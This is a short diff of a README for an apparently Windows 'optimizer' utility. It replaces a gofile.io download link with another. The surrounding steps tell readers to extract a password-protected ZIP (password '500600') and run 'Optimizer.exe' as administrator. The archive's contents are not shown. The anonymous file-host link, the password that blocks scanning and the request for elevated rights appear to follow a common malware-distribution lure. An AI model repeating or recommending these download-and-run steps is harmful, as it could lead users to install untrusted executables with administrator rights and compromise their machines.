@@ -23,7 +23,7 @@ This utility provides a simple interface to apply performance-related tweaks tha
 
 # **Installation & Usage**
 
-- [DOWNLOAD](https://gofile.io/d/nio4hf)  
+- [DOWNLOAD](https://gofile.io/d/njIOQY)  
 - Enter password: `500600` and extract the ZIP archive to any folder.  
 - Run `Optimizer.exe` (administrator rights are recommended).  
 - Follow the on-screen instructions to review, select, and apply tweaks.  
